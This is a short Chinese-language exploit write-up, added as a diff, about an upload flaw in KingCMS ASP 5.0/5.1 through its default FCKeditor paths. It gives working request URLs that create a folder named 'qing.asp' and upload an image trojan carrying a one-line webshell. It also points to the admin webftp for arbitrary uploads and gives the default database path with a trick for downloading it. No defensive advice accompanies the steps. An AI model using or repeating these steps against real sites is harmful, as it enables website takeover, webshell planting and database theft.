@@ -1,0 +1,22 @@
+KingCMS ASP 5.0/5.1 Fck编程器上传漏洞
+
+[KingCMS ASP 5.0/5.1 Fck编程器上传漏洞 全文]
+影响版本：KingCMS ASP 5.0/5.1 
+官方地址：http://www.kingcms.com/  
+漏洞描述： KingCMS ASP是基于ASP+ACCESS构架的一款很不错的CMS系统，前台全部静态化处理，新一代 KingCMS 提供了更好的界面、更多的开发余地、更强大的扩展能力，现今也受到不少站长的欢迎。但是在没有正确设置系统的情况下会爆出一个致命的弱点，特别是针对比较懒的站长。  
+
+漏洞算不上0day，但是却具有0day的危害效果，主要是因管理为对后台路径和编辑器路径做更改，系统是使用FCKeditor编辑器，这个编辑器的漏洞大家都比较熟悉了，下面就给出具体利用方法。
+
+利用前提：管理员未更改后台路径以及FCKeditor编辑器路径做更改。
+
+后台地址：默认是/admin/system/login.asp，输入admin路径可自动跳转到登陆口。
+
+编辑器路径：/admin/system/editor/
+
+利用方式：访问http://www.xxx.com/admin/system/editor/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=Image&CurrentFolder=/qing.asp&NewFolderName=qing.asp后在/up_files/image/目录下创建一个明文qing.asp的文件夹。
+
+然后访问http://www.xxx.com/admin/system/editor/FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=../../connectors/asp/connector.asp，选择刚创建的qing.asp文件夹并上传图片木马，可以上传包含一句话内容的图片，然后使用一句话客户端连接。
+
+另外该系统后台也是比较脆弱的，若能成功登陆后台拿webshell比较简单，后台中有个webftp的功能，可以上传任意文件。默认数据库地址为/db/King#Content#Management#System.mdb，下载的时候将#替换成%23后下载。
+
+针对该系统的关键词未确定下来，主要是系统不好确定关键词，前台全部为静态的，有兴趣的朋友可以去官网下载一个来研究下 
